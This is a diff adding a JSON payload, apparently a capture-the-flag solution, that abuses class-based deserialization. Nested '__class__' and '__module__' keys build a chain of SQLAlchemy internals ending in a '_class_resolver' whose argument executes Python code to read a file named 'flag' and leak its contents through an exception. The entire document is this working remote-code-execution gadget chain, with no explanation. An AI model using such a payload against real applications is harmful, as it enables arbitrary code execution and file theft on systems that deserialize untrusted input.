@@ -1,0 +1,23 @@
+{
+    "__class__": "RecipeCreateRequest",
+    "__module__": "__main__",
+    "materials": {
+        "__class__": "RecipeCreateRequest",
+        "__module__": "__main__",
+        "split": {
+            "__class__": "BooleanPredicate",
+            "__module__": "sqlalchemy.testing.exclusions",
+            "value": {
+                "__class__": "ConventionDict",
+                "__module__": "sqlalchemy.sql.naming",
+                "convention": [],
+                "_key_0": {
+                    "__class__": "_class_resolver",
+                    "__module__": "sqlalchemy.ext.declarative.clsregistry",
+                    "arg": "exec(\"raise Exception(open('flag').read())\")",
+                    "_dict": {}
+                }
+            }
+        }
+    }
+}
